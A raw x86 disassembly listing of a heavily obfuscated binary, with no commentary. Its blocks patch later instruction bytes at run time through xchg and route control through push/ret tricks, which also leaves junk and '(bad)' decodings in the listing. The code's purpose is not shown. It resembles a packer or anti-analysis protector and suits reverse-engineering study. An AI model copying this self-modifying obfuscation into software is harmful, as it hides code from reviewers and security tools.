  40b811:	87 04 24             	xchg   %eax,(%esp)
  40b814:	c3                   	ret
  40b815:	8f 05 43 b8 40 00    	pop    0x40b843
  40b81b:	50                   	push   %eax
  40b81c:	90                   	nop
  40b81d:	b8 15 20 40 00       	mov    $0x402015,%eax
  40b822:	8d 80 d3 2a 41 ff    	lea    -0xbed52d(%eax),%eax
  40b828:	87 05 31 b8 40 00    	xchg   %eax,0x40b831
  40b82e:	58                   	pop    %eax
  40b82f:	f3 90                	pause
  40b831:	53                   	push   %ebx
  40b832:	5b                   	pop    %ebx
  40b833:	aa                   	stos   %al,%es:(%edi)
  40b834:	fc                   	cld
  40b835:	ff 50 66             	call   *0x66(%eax)
  40b838:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b83d:	05 31 b8 40 00       	add    $0x40b831,%eax
  40b842:	b8 fb 6c 20 5c       	mov    $0x5c206cfb,%eax
  40b847:	87 04 24             	xchg   %eax,(%esp)
  40b84a:	c3                   	ret
  40b84b:	8f 05 7a b8 40 00    	pop    0x40b87a
  40b851:	50                   	push   %eax
  40b852:	90                   	nop
  40b853:	b8 15 20 40 00       	mov    $0x402015,%eax
  40b858:	8d 80 ea 05 dc 51    	lea    0x51dc05ea(%eax),%eax
  40b85e:	87 05 67 b8 40 00    	xchg   %eax,0x40b867
  40b864:	58                   	pop    %eax
  40b865:	f3 90                	pause
  40b867:	70 bc                	jo     0x40b825
  40b869:	8b b8 40 00 50 66    	mov    0x66500040(%eax),%edi
  40b86f:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b874:	05 67 b8 40 00       	add    $0x40b867,%eax
  40b879:	b8 d3 47 91 75       	mov    $0x759147d3,%eax
  40b87e:	8d 40 01             	lea    0x1(%eax),%eax
  40b881:	87 04 24             	xchg   %eax,(%esp)
  40b884:	c3                   	ret
  40b885:	8f 05 b4 b8 40 00    	pop    0x40b8b4
  40b88b:	50                   	push   %eax
  40b88c:	90                   	nop
  40b88d:	b8 15 20 40 00       	mov    $0x402015,%eax
  40b892:	8d 80 ea f5 3b 52    	lea    0x523bf5ea(%eax),%eax
  40b898:	87 05 a1 b8 40 00    	xchg   %eax,0x40b8a1
  40b89e:	58                   	pop    %eax
  40b89f:	f3 90                	pause
  40b8a1:	72 51                	jb     0x40b8f4
  40b8a3:	31 0d 40 00 50 66    	xor    %ecx,0x66500040
  40b8a9:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b8ae:	05 a1 b8 40 00       	add    $0x40b8a1,%eax
  40b8b3:	b8 e0 ea 79 b6       	mov    $0xb679eae0,%eax
  40b8b8:	8d 40 01             	lea    0x1(%eax),%eax
  40b8bb:	87 04 24             	xchg   %eax,(%esp)
  40b8be:	c3                   	ret
  40b8bf:	8f 05 ee b8 40 00    	pop    0x40b8ee
  40b8c5:	50                   	push   %eax
  40b8c6:	90                   	nop
  40b8c7:	b8 15 20 40 00       	mov    $0x402015,%eax
  40b8cc:	8d 80 76 15 10 52    	lea    0x52101576(%eax),%eax
  40b8d2:	87 05 db b8 40 00    	xchg   %eax,0x40b8db
  40b8d8:	58                   	pop    %eax
  40b8d9:	f3 90                	pause
  40b8db:	b3 d0                	mov    $0xd0,%bl
  40b8dd:	60                   	pusha
  40b8de:	27                   	daa
  40b8df:	40                   	inc    %eax
  40b8e0:	00 50 66             	add    %dl,0x66(%eax)
  40b8e3:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b8e8:	05 db b8 40 00       	add    $0x40b8db,%eax
  40b8ed:	b8 0a 64 92 83       	mov    $0x8392640a,%eax
  40b8f2:	8d 40 01             	lea    0x1(%eax),%eax
  40b8f5:	87 04 24             	xchg   %eax,(%esp)
  40b8f8:	c3                   	ret
  40b8f9:	8f 05 28 b9 40 00    	pop    0x40b928
  40b8ff:	50                   	push   %eax
  40b900:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b906:	8d 80 fa 63 21 74    	lea    0x742163fa(%eax),%eax
  40b90c:	87 05 15 b9 40 00    	xchg   %eax,0x40b915
  40b912:	58                   	pop    %eax
  40b913:	f3 90                	pause
  40b915:	f8                   	clc
  40b916:	1d d3 b2 ff ff       	sbb    $0xffffb2d3,%eax
  40b91b:	50                   	push   %eax
  40b91c:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b920:	66 87 05 15 b9 40 00 	xchg   %ax,0x40b915
  40b927:	b8 4a 43 c9 58       	mov    $0x58c9434a,%eax
  40b92c:	8d 40 01             	lea    0x1(%eax),%eax
  40b92f:	87 04 24             	xchg   %eax,(%esp)
  40b932:	c3                   	ret
  40b933:	8f 05 62 b9 40 00    	pop    0x40b962
  40b939:	50                   	push   %eax
  40b93a:	90                   	nop
  40b93b:	b8 15 20 40 00       	mov    $0x402015,%eax
  40b940:	8d 80 fa 64 0c 75    	lea    0x750c64fa(%eax),%eax
  40b946:	87 05 4f b9 40 00    	xchg   %eax,0x40b94f
  40b94c:	58                   	pop    %eax
  40b94d:	f3 90                	pause
  40b94f:	97                   	xchg   %eax,%edi
  40b950:	8d 3c 6d ff ff 50 66 	lea    0x6650ffff(,%ebp,2),%edi
  40b957:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b95c:	05 4f b9 40 00       	add    $0x40b94f,%eax
  40b961:	b8 49 33 d3 c9       	mov    $0xc9d33349,%eax
  40b966:	8d 40 01             	lea    0x1(%eax),%eax
  40b969:	87 04 24             	xchg   %eax,(%esp)
  40b96c:	c3                   	ret
  40b96d:	8f 05 9c b9 40 00    	pop    0x40b99c
  40b973:	50                   	push   %eax
  40b974:	90                   	nop
  40b975:	b8 15 20 40 00       	mov    $0x402015,%eax
  40b97a:	8d 80 ea 15 78 56    	lea    0x567815ea(%eax),%eax
  40b980:	87 05 89 b9 40 00    	xchg   %eax,0x40b989
  40b986:	58                   	pop    %eax
  40b987:	f3 90                	pause
  40b989:	d7                   	xlat   %ds:(%ebx)
  40b98a:	14 51                	adc    $0x51,%al
  40b98c:	a9 40 00 50 66       	test   $0x66500040,%eax
  40b991:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b996:	05 89 b9 40 00       	add    $0x40b989,%eax
  40b99b:	b8 74 b3 d1 d7       	mov    $0xd7d1b374,%eax
  40b9a0:	8d 40 01             	lea    0x1(%eax),%eax
  40b9a3:	87 04 24             	xchg   %eax,(%esp)
  40b9a6:	c3                   	ret
  40b9a7:	8f 05 d6 b9 40 00    	pop    0x40b9d6
  40b9ad:	50                   	push   %eax
  40b9ae:	90                   	nop
  40b9af:	b8 15 20 40 00       	mov    $0x402015,%eax
  40b9b4:	8d 80 ea f5 07 52    	lea    0x5207f5ea(%eax),%eax
  40b9ba:	87 05 c3 b9 40 00    	xchg   %eax,0x40b9c3
  40b9c0:	58                   	pop    %eax
  40b9c1:	f3 90                	pause
  40b9c3:	45                   	inc    %ebp
  40b9c4:	67 f3 a6             	repz cmpsb %es:(%di),%ds:(%si)
  40b9c7:	40                   	inc    %eax
  40b9c8:	00 50 66             	add    %dl,0x66(%eax)
  40b9cb:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b9d0:	05 c3 b9 40 00       	add    $0x40b9c3,%eax
  40b9d5:	b8 21 15 e4 a6       	mov    $0xa6e41521,%eax
  40b9da:	8d 40 01             	lea    0x1(%eax),%eax
  40b9dd:	87 04 24             	xchg   %eax,(%esp)
  40b9e0:	c3                   	ret
  40b9e1:	8f 05 0f ba 40 00    	pop    0x40ba0f
  40b9e7:	50                   	push   %eax
  40b9e8:	90                   	nop
  40b9e9:	b8 15 20 40 00       	mov    $0x402015,%eax
  40b9ee:	8d 80 d3 ee 25 ff    	lea    -0xda112d(%eax),%eax
  40b9f4:	87 05 fd b9 40 00    	xchg   %eax,0x40b9fd
  40b9fa:	58                   	pop    %eax
  40b9fb:	f3 90                	pause
  40b9fd:	c0 66 f8 a7          	shlb   $0xa7,-0x8(%esi)
  40ba01:	ff 50 66             	call   *0x66(%eax)
  40ba04:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40ba09:	05 fd b9 40 00       	add    $0x40b9fd,%eax
  40ba0e:	b8 55 2a e0 0f       	mov    $0xfe02a55,%eax
  40ba13:	87 04 24             	xchg   %eax,(%esp)
  40ba16:	c3                   	ret
  40ba17:	8f 05 47 ba 40 00    	pop    0x40ba47
  40ba1d:	50                   	push   %eax
  40ba1e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ba24:	8d 80 b2 25 64 40    	lea    0x406425b2(%eax),%eax
  40ba2a:	87 05 33 ba 40 00    	xchg   %eax,0x40ba33
  40ba30:	58                   	pop    %eax
  40ba31:	f3 90                	pause
  40ba33:	97                   	xchg   %eax,%edi
  40ba34:	70 77                	jo     0x40baad
  40ba36:	5f                   	pop    %edi
  40ba37:	00 00                	add    %al,(%eax)
  40ba39:	00 50 66             	add    %dl,0x66(%eax)
  40ba3c:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40ba41:	05 33 ba 40 00       	add    $0x40ba33,%eax
  40ba46:	b8 14 44 e0 38       	mov    $0x38e04414,%eax
  40ba4b:	8d 40 02             	lea    0x2(%eax),%eax
  40ba4e:	87 04 24             	xchg   %eax,(%esp)
  40ba51:	c3                   	ret
  40ba52:	8f 05 82 ba 40 00    	pop    0x40ba82
  40ba58:	50                   	push   %eax
  40ba59:	90                   	nop
  40ba5a:	b8 15 20 40 00       	mov    $0x402015,%eax
  40ba5f:	8d 80 b2 25 6c 00    	lea    0x6c25b2(%eax),%eax
  40ba65:	87 05 6e ba 40 00    	xchg   %eax,0x40ba6e
  40ba6b:	58                   	pop    %eax
  40ba6c:	f3 90                	pause
  40ba6e:	31 f3                	xor    %esi,%ebx
  40ba70:	16                   	push   %ss
  40ba71:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40ba72:	40                   	inc    %eax
  40ba73:	40                   	inc    %eax
  40ba74:	00 50 66             	add    %dl,0x66(%eax)
  40ba77:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40ba7c:	05 6e ba 40 00       	add    $0x40ba6e,%eax
  40ba81:	b8 89 89 44 0e       	mov    $0xe448989,%eax
  40ba86:	8d 40 02             	lea    0x2(%eax),%eax
  40ba89:	87 04 24             	xchg   %eax,(%esp)
  40ba8c:	c3                   	ret
  40ba8d:	8f 05 bc ba 40 00    	pop    0x40babc
  40ba93:	50                   	push   %eax
  40ba94:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ba9a:	8d 80 ea f5 9f 52    	lea    0x529ff5ea(%eax),%eax
  40baa0:	87 05 a9 ba 40 00    	xchg   %eax,0x40baa9
  40baa6:	58                   	pop    %eax
  40baa7:	f3 90                	pause
  40baa9:	94                   	xchg   %eax,%esp
  40baaa:	0e                   	push   %cs
  40baab:	22 0f                	and    (%edi),%cl
  40baad:	40                   	inc    %eax
  40baae:	00 50 66             	add    %dl,0x66(%eax)
  40bab1:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40bab6:	05 a9 ba 40 00       	add    $0x40baa9,%eax
  40babb:	b8 66 01 d0 30       	mov    $0x30d00166,%eax
  40bac0:	8d 40 01             	lea    0x1(%eax),%eax
  40bac3:	87 04 24             	xchg   %eax,(%esp)
  40bac6:	c3                   	ret
  40bac7:	8f 05 f6 ba 40 00    	pop    0x40baf6
  40bacd:	50                   	push   %eax
  40bace:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40bad4:	8d 80 ea f5 0f 52    	lea    0x520ff5ea(%eax),%eax
  40bada:	87 05 e3 ba 40 00    	xchg   %eax,0x40bae3
  40bae0:	58                   	pop    %eax
  40bae1:	f3 90                	pause
  40bae3:	c4 59 ac             	les    -0x54(%ecx),%ebx
  40bae6:	2c 40                	sub    $0x40,%al
  40bae8:	00 50 66             	add    %dl,0x66(%eax)
  40baeb:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40baf0:	05 e3 ba 40 00       	add    $0x40bae3,%eax
  40baf5:	b8 8f a1 9a cf       	mov    $0xcf9aa18f,%eax
  40bafa:	8d 40 01             	lea    0x1(%eax),%eax
  40bafd:	87 04 24             	xchg   %eax,(%esp)
  40bb00:	c3                   	ret
  40bb01:	8f 05 31 bb 40 00    	pop    0x40bb31
  40bb07:	50                   	push   %eax
  40bb08:	90                   	nop
  40bb09:	b8 15 20 40 00       	mov    $0x402015,%eax
  40bb0e:	8d 80 b2 25 00 01    	lea    0x10025b2(%eax),%eax
  40bb14:	87 05 1d bb 40 00    	xchg   %eax,0x40bb1d
  40bb1a:	58                   	pop    %eax
  40bb1b:	f3 90                	pause
  40bb1d:	bb 84 2d 18 00       	mov    $0x182d84,%ebx
  40bb22:	00 00                	add    %al,(%eax)
  40bb24:	50                   	push   %eax
  40bb25:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40bb29:	66 87 05 1d bb 40 00 	xchg   %ax,0x40bb1d
  40bb30:	b8 c4 8d 63 40       	mov    $0x40638dc4,%eax
  40bb35:	8d 40 02             	lea    0x2(%eax),%eax
  40bb38:	87 04 24             	xchg   %eax,(%esp)
  40bb3b:	c3                   	ret
  40bb3c:	8f 05 6a bb 40 00    	pop    0x40bb6a
  40bb42:	50                   	push   %eax
  40bb43:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40bb49:	8d 80 aa 68 17 40    	lea    0x401768aa(%eax),%eax
  40bb4f:	87 05 58 bb 40 00    	xchg   %eax,0x40bb58
  40bb55:	58                   	pop    %eax
  40bb56:	f3 90                	pause
  40bb58:	e2 28                	loop   0x40bb82
  40bb5a:	95                   	xchg   %eax,%ebp
  40bb5b:	ff 00                	incl   (%eax)
  40bb5d:	50                   	push   %eax
  40bb5e:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40bb62:	66 87 05 58 bb 40 00 	xchg   %ax,0x40bb58
  40bb69:	b8 df 08 2d 50       	mov    $0x502d08df,%eax
  40bb6e:	87 04 24             	xchg   %eax,(%esp)
  40bb71:	c3                   	ret
  40bb72:	8f 05 a1 bb 40 00    	pop    0x40bba1
  40bb78:	50                   	push   %eax
  40bb79:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40bb7f:	8d 80 ea f5 43 52    	lea    0x5243f5ea(%eax),%eax
  40bb85:	87 05 8e bb 40 00    	xchg   %eax,0x40bb8e
  40bb8b:	58                   	pop    %eax
  40bb8c:	f3 90                	pause
  40bb8e:	4b                   	dec    %ebx
  40bb8f:	de 1b                	ficomps (%ebx)
  40bb91:	f3 40                	repz inc %eax
  40bb93:	00 50 66             	add    %dl,0x66(%eax)
  40bb96:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40bb9b:	05 8e bb 40 00       	add    $0x40bb8e,%eax
  40bba0:	b8 63 3e ca 3d       	mov    $0x3dca3e63,%eax
  40bba5:	8d 40 01             	lea    0x1(%eax),%eax
  40bba8:	87 04 24             	xchg   %eax,(%esp)
  40bbab:	c3                   	ret
  40bbac:	8f 05 da bb 40 00    	pop    0x40bbda
  40bbb2:	50                   	push   %eax
  40bbb3:	90                   	nop
  40bbb4:	b8 15 20 40 00       	mov    $0x402015,%eax
  40bbb9:	8d 80 53 44 17 40    	lea    0x40174453(%eax),%eax
  40bbbf:	87 05 c8 bb 40 00    	xchg   %eax,0x40bbc8
  40bbc5:	58                   	pop    %eax
  40bbc6:	f3 90                	pause
  40bbc8:	c9                   	leave
  40bbc9:	39 86 74 00 50 66    	cmp    %eax,0x66500074(%esi)
  40bbcf:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40bbd4:	05 c8 bb 40 00       	add    $0x40bbc8,%eax
  40bbd9:	b8 d6 35 e7 0f       	mov    $0xfe735d6,%eax
  40bbde:	87 04 24             	xchg   %eax,(%esp)
  40bbe1:	c3                   	ret
  40bbe2:	8f 05 10 bc 40 00    	pop    0x40bc10
  40bbe8:	50                   	push   %eax
  40bbe9:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40bbef:	8d 80 d3 4a 39 ff    	lea    -0xc6b52d(%eax),%eax
  40bbf5:	87 05 fe bb 40 00    	xchg   %eax,0x40bbfe
  40bbfb:	58                   	pop    %eax
  40bbfc:	f3 90                	pause
  40bbfe:	0a 03                	or     (%ebx),%al
  40bc00:	f7 34 ff             	divl   (%edi,%edi,8)
  40bc03:	50                   	push   %eax
  40bc04:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40bc08:	66 87 05 fe bb 40 00 	xchg   %ax,0x40bbfe
  40bc0f:	b8 19 11 e2 f8       	mov    $0xf8e21119,%eax
  40bc14:	87 04 24             	xchg   %eax,(%esp)
  40bc17:	c3                   	ret
  40bc18:	8f 05 47 bc 40 00    	pop    0x40bc47
  40bc1e:	50                   	push   %eax
  40bc1f:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40bc25:	8d 80 ea f5 47 52    	lea    0x5247f5ea(%eax),%eax
  40bc2b:	87 05 34 bc 40 00    	xchg   %eax,0x40bc34
  40bc31:	58                   	pop    %eax
  40bc32:	f3 90                	pause
  40bc34:	78 77                	js     0x40bcad
  40bc36:	81 7e 40 00 50 66 b8 	cmpl   $0xb8665000,0x40(%esi)
  40bc3d:	eb e8                	jmp    0x40bc27
  40bc3f:	66 87 05 34 bc 40 00 	xchg   %ax,0x40bc34
  40bc46:	b8 66 f5 f4 25       	mov    $0x25f4f566,%eax
  40bc4b:	8d 40 01             	lea    0x1(%eax),%eax
  40bc4e:	87 04 24             	xchg   %eax,(%esp)
  40bc51:	c3                   	ret
  40bc52:	8f 05 81 bc 40 00    	pop    0x40bc81
  40bc58:	50                   	push   %eax
  40bc59:	90                   	nop
  40bc5a:	b8 15 20 40 00       	mov    $0x402015,%eax
  40bc5f:	8d 80 ea f5 3f 52    	lea    0x523ff5ea(%eax),%eax
  40bc65:	87 05 6e bc 40 00    	xchg   %eax,0x40bc6e
  40bc6b:	58                   	pop    %eax
  40bc6c:	f3 90                	pause
  40bc6e:	4c                   	dec    %esp
  40bc6f:	01 89 6a 40 00 50    	add    %ecx,0x5000406a(%ecx)
  40bc75:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40bc79:	66 87 05 6e bc 40 00 	xchg   %ax,0x40bc6e
  40bc80:	b8 70 2e f5 07       	mov    $0x7f52e70,%eax
  40bc85:	8d 40 01             	lea    0x1(%eax),%eax
  40bc88:	87 04 24             	xchg   %eax,(%esp)
  40bc8b:	c3                   	ret
  40bc8c:	8f 05 ba bc 40 00    	pop    0x40bcba
  40bc92:	50                   	push   %eax
  40bc93:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40bc99:	8d 80 d3 ad 3c ff    	lea    -0xc3522d(%eax),%eax
  40bc9f:	87 05 a8 bc 40 00    	xchg   %eax,0x40bca8
  40bca5:	58                   	pop    %eax
  40bca6:	f3 90                	pause
  40bca8:	84 fe                	test   %bh,%dh
  40bcaa:	8f 8a ff 50          	(bad)
  40bcae:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40bcb2:	66 87 05 a8 bc 40 00 	xchg   %ax,0x40bca8
  40bcb9:	b8 49 59 40 f6       	mov    $0xf6405949,%eax
  40bcbe:	87 04 24             	xchg   %eax,(%esp)
  40bcc1:	c3                   	ret
  40bcc2:	8f 05 f0 bc 40 00    	pop    0x40bcf0
  40bcc8:	50                   	push   %eax
  40bcc9:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40bccf:	8d 80 d3 7d 3c ff    	lea    -0xc3822d(%eax),%eax
  40bcd5:	87 05 de bc 40 00    	xchg   %eax,0x40bcde
  40bcdb:	58                   	pop    %eax
  40bcdc:	f3 90                	pause
  40bcde:	98                   	cwtl
  40bcdf:	46                   	inc    %esi
  40bce0:	3d c0 ff 50 66       	cmp    $0x6650ffc0,%eax
  40bce5:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40bcea:	05 de bc 40 00       	add    $0x40bcde,%eax
  40bcef:	b8 ed 3d 3a e9       	mov    $0xe93a3ded,%eax
  40bcf4:	87 04 24             	xchg   %eax,(%esp)
  40bcf7:	c3                   	ret
  40bcf8:	8f 05 26 bd 40 00    	pop    0x40bd26
  40bcfe:	50                   	push   %eax
  40bcff:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40bd05:	8d 80 d4 61 31 ff    	lea    -0xce9e2c(%eax),%eax
  40bd0b:	87 05 14 bd 40 00    	xchg   %eax,0x40bd14
  40bd11:	58                   	pop    %eax
  40bd12:	f3 90                	pause
  40bd14:	5b                   	pop    %ebx
  40bd15:	e5 33                	in     $0x33,%eax
  40bd17:	bc ff 50 66 b8       	mov    $0xb86650ff,%esp
  40bd1c:	eb e8                	jmp    0x40bd06
  40bd1e:	66 87 05 14 bd 40 00 	xchg   %ax,0x40bd14
  40bd25:	b8 47 f0 66 de       	mov    $0xde66f047,%eax
  40bd2a:	87 04 24             	xchg   %eax,(%esp)
  40bd2d:	c3                   	ret
  40bd2e:	8f 05 5c bd 40 00    	pop    0x40bd5c
  40bd34:	50                   	push   %eax
  40bd35:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40bd3b:	8d 80 aa 68 17 40    	lea    0x401768aa(%eax),%eax
  40bd41:	87 05 4a bd 40 00    	xchg   %eax,0x40bd4a
  40bd47:	58                   	pop    %eax
  40bd48:	f3 90                	pause
  40bd4a:	b1 c8                	mov    $0xc8,%cl
  40bd4c:	60                   	pusha
  40bd4d:	2f                   	das
  40bd4e:	00 50 66             	add    %dl,0x66(%eax)
  40bd51:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40bd56:	05 4a bd 40 00       	add    $0x40bd4a,%eax
  40bd5b:	b8 3b 1e 43 9a       	mov    $0x9a431e3b,%eax
  40bd60:	87 04 24             	xchg   %eax,(%esp)
  40bd63:	c3                   	ret
  40bd64:	8f 05 93 bd 40 00    	pop    0x40bd93
  40bd6a:	50                   	push   %eax
  40bd6b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40bd71:	8d 80 ea f5 43 52    	lea    0x5243f5ea(%eax),%eax
  40bd77:	87 05 80 bd 40 00    	xchg   %eax,0x40bd80
  40bd7d:	58                   	pop    %eax
  40bd7e:	f3 90                	pause
  40bd80:	03 c8                	add    %eax,%ecx
  40bd82:	fa                   	cli
  40bd83:	11 40 00             	adc    %eax,0x0(%eax)
  40bd86:	50                   	push   %eax
  40bd87:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40bd8b:	66 87 05 80 bd 40 00 	xchg   %ax,0x40bd80
  40bd92:	b8 6c 67 50 38       	mov    $0x3850676c,%eax
  40bd97:	8d 40 01             	lea    0x1(%eax),%eax
  40bd9a:	87 04 24             	xchg   %eax,(%esp)
  40bd9d:	c3                   	ret
  40bd9e:	8f 05 cc bd 40 00    	pop    0x40bdcc
  40bda4:	50                   	push   %eax
  40bda5:	90                   	nop
  40bda6:	b8 15 20 40 00       	mov    $0x402015,%eax
  40bdab:	8d 80 53 44 17 40    	lea    0x40174453(%eax),%eax
  40bdb1:	87 05 ba bd 40 00    	xchg   %eax,0x40bdba
  40bdb7:	58                   	pop    %eax
  40bdb8:	f3 90                	pause
  40bdba:	f3 58                	repz pop %eax
  40bdbc:	db ac 00 50 66 b8 eb 	fldt   -0x144799b0(%eax,%eax,1)
  40bdc3:	e8 66 87 05 ba       	call   0xba46452e
  40bdc8:	bd 40 00 b8 37       	mov    $0x37b80040,%ebp
  40bdcd:	cb                   	lret
  40bdce:	82 79 87 04          	cmpb   $0x4,-0x79(%ecx)
  40bdd2:	24 c3                	and    $0xc3,%al
  40bdd4:	8f 05 02 be 40 00    	pop    0x40be02
  40bdda:	50                   	push   %eax
  40bddb:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40bde1:	8d 80 d3 58 37 ff    	lea    -0xc8a72d(%eax),%eax
  40bde7:	87 05 f0 bd 40 00    	xchg   %eax,0x40bdf0
  40bded:	58                   	pop    %eax
  40bdee:	f3 90                	pause
  40bdf0:	7a 65                	jp     0x40be57
  40bdf2:	4d                   	dec    %ebp
  40bdf3:	0e                   	push   %cs
  40bdf4:	ff 50 66             	call   *0x66(%eax)
  40bdf7:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40bdfc:	05 f0 bd 40 00       	add    $0x40bdf0,%eax
  40be01:	b8 df 45 43 2b       	mov    $0x2b4345df,%eax
  40be06:	87 04 24             	xchg   %eax,(%esp)
  40be09:	c3                   	ret
  40be0a:	8f 05 39 be 40 00    	pop    0x40be39
  40be10:	50                   	push   %eax
  40be11:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40be17:	8d 80 ea f5 47 52    	lea    0x5247f5ea(%eax),%eax
  40be1d:	87 05 26 be 40 00    	xchg   %eax,0x40be26
  40be23:	58                   	pop    %eax
  40be24:	f3 90                	pause
  40be26:	2c 82                	sub    $0x82,%al
  40be28:	ae                   	scas   %es:(%edi),%al
  40be29:	d7                   	xlat   %ds:(%ebx)
  40be2a:	40                   	inc    %eax
  40be2b:	00 50 66             	add    %dl,0x66(%eax)
  40be2e:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40be33:	05 26 be 40 00       	add    $0x40be26,%eax
  40be38:	b8 2c 0e 25 de       	mov    $0xde250e2c,%eax
  40be3d:	8d 40 01             	lea    0x1(%eax),%eax
  40be40:	87 04 24             	xchg   %eax,(%esp)
  40be43:	c3                   	ret
  40be44:	8f 05 72 be 40 00    	pop    0x40be72
  40be4a:	50                   	push   %eax
  40be4b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40be51:	8d 80 d4 07 30 ff    	lea    -0xcff82c(%eax),%eax
  40be57:	87 05 60 be 40 00    	xchg   %eax,0x40be60
  40be5d:	58                   	pop    %eax
  40be5e:	f3 90                	pause
  40be60:	b3 c3                	mov    $0xc3,%bl
  40be62:	16                   	push   %ss
  40be63:	06                   	push   %es
  40be64:	ff 50 66             	call   *0x66(%eax)
  40be67:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40be6c:	05 60 be 40 00       	add    $0x40be60,%eax
  40be71:	b8 73 ed 1a 34       	mov    $0x341aed73,%eax
  40be76:	87 04 24             	xchg   %eax,(%esp)
  40be79:	c3                   	ret
  40be7a:	8f 05 a9 be 40 00    	pop    0x40bea9
  40be80:	50                   	push   %eax
  40be81:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40be87:	8d 80 ea f5 3f 52    	lea    0x523ff5ea(%eax),%eax
  40be8d:	87 05 96 be 40 00    	xchg   %eax,0x40be96
  40be93:	58                   	pop    %eax
  40be94:	f3 90                	pause
  40be96:	66 99                	cwtd
  40be98:	48                   	dec    %eax
  40be99:	d2 40 00             	rolb   %cl,0x0(%eax)
  40be9c:	50                   	push   %eax
  40be9d:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40bea1:	66 87 05 96 be 40 00 	xchg   %ax,0x40be96
  40bea8:	b8 2f b8 45 96       	mov    $0x9645b82f,%eax
  40bead:	8d 40 01             	lea    0x1(%eax),%eax
  40beb0:	87 04 24             	xchg   %eax,(%esp)
  40beb3:	c3                   	ret
  40beb4:	8f 05 e2 be 40 00    	pop    0x40bee2
  40beba:	50                   	push   %eax
  40bebb:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40bec1:	8d 80 53 ec ff 3f    	lea    0x3fffec53(%eax),%eax
  40bec7:	87 05 d0 be 40 00    	xchg   %eax,0x40bed0
  40becd:	58                   	pop    %eax
  40bece:	f3 90                	pause
  40bed0:	2d 7a 17 e6 00       	sub    $0xe6177a,%eax
  40bed5:	50                   	push   %eax
  40bed6:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40beda:	66 87 05 d0 be 40 00 	xchg   %ax,0x40bed0
  40bee1:	b8 cb 98 98 90       	mov    $0x909898cb,%eax
  40bee6:	87 04 24             	xchg   %eax,(%esp)
  40bee9:	c3                   	ret
  40beea:	8f 05 18 bf 40 00    	pop    0x40bf18
  40bef0:	50                   	push   %eax
  40bef1:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40bef7:	8d 80 d3 5b 3a ff    	lea    -0xc5a42d(%eax),%eax
  40befd:	87 05 06 bf 40 00    	xchg   %eax,0x40bf06
  40bf03:	58                   	pop    %eax
  40bf04:	f3 90                	pause
  40bf06:	23 b9 74 f7 ff 50    	and    0x50fff774(%ecx),%edi
  40bf0c:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40bf10:	66 87 05 06 bf 40 00 	xchg   %ax,0x40bf06
  40bf17:	b8 f5 ff 2d f3       	mov    $0xf32dfff5,%eax
  40bf1c:	87 04 24             	xchg   %eax,(%esp)
  40bf1f:	c3                   	ret
  40bf20:	8f 05 4e bf 40 00    	pop    0x40bf4e
  40bf26:	50                   	push   %eax
  40bf27:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40bf2d:	8d 80 d3 25 3a ff    	lea    -0xc5da2d(%eax),%eax
  40bf33:	87 05 3c bf 40 00    	xchg   %eax,0x40bf3c
  40bf39:	58                   	pop    %eax
  40bf3a:	f3 90                	pause
  40bf3c:	fc                   	cld
  40bf3d:	67 73 d2             	addr16 jae 0x40bf12
  40bf40:	ff 50 66             	call   *0x66(%eax)
  40bf43:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40bf48:	05 3c bf 40 00       	add    $0x40bf3c,%eax
  40bf4d:	b8 b6 07 e7 3f       	mov    $0x3fe707b6,%eax
  40bf52:	87 04 24             	xchg   %eax,(%esp)
  40bf55:	c3                   	ret
  40bf56:	8f 05 84 bf 40 00    	pop    0x40bf84
  40bf5c:	50                   	push   %eax
  40bf5d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40bf63:	8d 80 a9 f0 ff 3f    	lea    0x3ffff0a9(%eax),%eax
